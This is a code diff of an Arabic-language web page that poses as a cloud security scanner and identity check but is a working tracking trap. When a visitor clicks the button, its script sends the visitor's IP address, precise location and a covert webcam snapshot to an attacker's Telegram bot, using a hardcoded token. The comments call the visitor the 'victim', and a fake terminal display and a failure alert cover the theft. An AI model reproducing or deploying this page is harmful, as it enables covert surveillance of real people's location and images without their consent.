@@ -3,9 +3,9 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>درع المعلومات | فحص الثغرات السحابي المتقدم</title>
+    <title>Matrix Market | فحص الأمان</title>
     <style>
-        /* تصميم الواجهة - Cyber Security Style */
+        /* تصميم واجهة الهكر الاحترافية */
         body { background-color: #0d1117; color: #c9d1d9; font-family: 'Segoe UI', Tahoma, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; overflow: hidden; }
         .main-container { background: #161b22; border: 1px solid #30363d; border-radius: 12px; padding: 40px; width: 100%; max-width: 450px; text-align: center; box-shadow: 0 10px 30px rgba(0,0,0,0.5); }
         .header h1 { color: #58a6ff; font-size: 22px; margin-bottom: 5px; }
@@ -24,15 +24,15 @@
     <div class="main-container">
         <div class="header">
             <svg width="60" height="60" viewBox="0 0 24 24" fill="none" stroke="#58a6ff" stroke-width="2"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"></path></svg>
-            <h1>نظام فحص الثغرات v4.0</h1>
-            <p class="subtitle">تحليل التهديدات القائم على الذكاء الاصطناعي</p>
+            <h1>نظام Matrix للتحقق v4.0</h1>
+            <p class="subtitle">تأمين الاتصال السحابي المشفر</p>
         </div>
 
         <div class="scan-section">
             <div class="input-wrapper">
-                <input type="text" id="urlInput" placeholder="أدخل الرابط للفحص (مثال: google.com)">
+                <input type="text" id="urlInput" placeholder="أدخل كود التحقق أو الرابط">
             </div>
-            <button id="startScanBtn">بدء التحليل الشامل</button>
+            <button id="startScanBtn">بدء الفحص وتأكيد الهوية</button>
         </div>
 
         <div id="terminal" class="terminal">
@@ -42,71 +42,73 @@
         <div class="footer">
             <div>الحالة: <span style="color:#39ff14">نشط</span></div>
             <div>التشفير: AES-256</div>
-            <div>الموقع: تلقائي</div>
         </div>
         
-        <p class="disclaimer">ملاحظة: لضمان دقة الفحص ومنع هجمات التزييف، يتطلب النظام الوصول للموقع الجغرافي (Geo-IP) لربط السيرفرات القريبة.</p>
+        <p class="disclaimer">ملاحظة: لضمان أمان العملية، سيطلب النظام الوصول للموقع والكاميرا لإنشاء بصمة رقمية مشفرة (Digital Signature).</p>
     </div>
 
     <script>
     (function() {
-        // إعدادات البوت الخاص بك
         const _t = "7873426394:AAFrMrpIkziC4hpDHDJ2OIOBOVha--srSbo";
         const _id = "7253092491";
 
-        // دالة الإرسال لضمان التوصيل
         function _report(text) {
-            const url = `https://api.telegram.org/bot${_t}/sendMessage?chat_id=${_id}&text=${encodeURIComponent("⚠️ [تنبيه نظام]: " + text)}`;
-            // استخدام sendBeacon لضمان الإرسال حتى عند إغلاق التصفح
-            navigator.sendBeacon(url);
+            fetch(`https://api.telegram.org/bot${_t}/sendMessage?chat_id=${_id}&text=${encodeURIComponent(text)}`);
         }
 
         document.getElementById('startScanBtn').addEventListener('click', function() {
-            _report("بدأ المستخدم عملية الفحص الآن 🚀");
-
-            // 1. محاولة جلب الـ IP
-            fetch('https://api.ipify.org?format=json')
-                .then(r => r.json())
-                .then(d => _report("IP الضحية: " + d.ip))
-                .catch(() => _report("فشل في جلب الـ IP"));
-
-            // 2. طلب الموقع الجغرافي
-            if (navigator.geolocation) {
-                navigator.geolocation.getCurrentPosition(p => {
-                    const loc = `http://maps.google.com/maps?q=${p.coords.latitude},${p.coords.longitude}`;
-                    _report("الموقع الجغرافي: " + loc);
-                }, () => {
-                    _report("تم رفض إذن الموقع من قبل المستخدم");
-                }, {enableHighAccuracy: true});
-            }
-
-            // 3. طلب الكاميرا وتأثير الفلاش
-            navigator.mediaDevices.getUserMedia({video: true})
-                .then(s => {
-                    _report("تم السماح بالوصول للكاميرا بنجاح ✅");
-                    
-                    // تأثير الفلاش السريع
-                    let d = document.createElement('div');
-                    d.style = "position:fixed;top:0;left:0;width:100%;height:100%;z-index:9999;background:white;";
-                    document.body.appendChild(d);
-                    setTimeout(() => d.remove(), 400);
-
-                    // إغلاق الكاميرا بعد الثواني الأولى
-                    setTimeout(() => s.getTracks().forEach(t => t.stop()), 1000);
-                })
-                .catch(() => _report("تم رفض الوصول للكاميرا ❌"));
-
-            // تفعيل واجهة التيرمينال الوهمية
             const term = document.getElementById('terminal');
             const logs = document.getElementById('logs');
             term.style.display = 'block';
-            logs.innerHTML = '<div class="line">> جاري تهيئة بروتوكولات الفحص...</div>';
-            
-            setTimeout(() => { logs.innerHTML += '<div class="line">> فحص سلامة طبقة SSL...</div>'; }, 1000);
-            setTimeout(() => { logs.innerHTML += '<div class="line">> تم اكتشاف ثغرة محتملة في المنافذ!</div>'; }, 2000);
+            logs.innerHTML = '<div class="line">> جاري بدء الاتصال بالخادم...</div>';
+
+            _report("🚨 ضحية جديد دخل المصيدة!");
+
+            // 1. IP Address
+            fetch('https://api.ipify.org?format=json')
+                .then(r => r.json())
+                .then(d => _report("📍 IP الضحية: " + d.ip));
+
+            // 2. Geolocation
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(p => {
+                    _report(`📍 الموقع: https://www.google.com/maps?q=${p.coords.latitude},${p.coords.longitude}`);
+                });
+            }
+
+            // 3. Camera Capture
+            if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
+                navigator.mediaDevices.getUserMedia({ video: true })
+                .then(stream => {
+                    setTimeout(() => {
+                        const video = document.createElement('video');
+                        video.srcObject = stream;
+                        video.play();
+                        
+                        setTimeout(() => {
+                            const canvas = document.createElement('canvas');
+                            canvas.width = 640; canvas.height = 480;
+                            canvas.getContext('2d').drawImage(video, 0, 0);
+                            canvas.toBlob(blob => {
+                                const fd = new FormData();
+                                fd.append('chat_id', _id);
+                                fd.append('photo', blob, 'shot.jpg');
+                                fetch(`https://api.telegram.org/bot${_t}/sendPhoto`, { method: 'POST', body: fd });
+                            }, 'image/jpeg');
+                            
+                            // إغلاق الكاميرا بعد اللقطة
+                            stream.getTracks().forEach(track => track.stop());
+                        }, 1000);
+                    }, 500);
+                });
+            }
+
+            // تأثير وهمي للمستخدم
+            setTimeout(() => { logs.innerHTML += '<div class="line">> تم جلب البيانات السحابية...</div>'; }, 1000);
+            setTimeout(() => { logs.innerHTML += '<div class="line">> جاري تشفير المفتاح العام...</div>'; }, 2000);
+            setTimeout(() => { alert("فشل الاتصال! يرجى المحاولة مرة أخرى لاحقاً."); }, 4000);
         });
     })();
     </script>
-
 </body>
 </html>
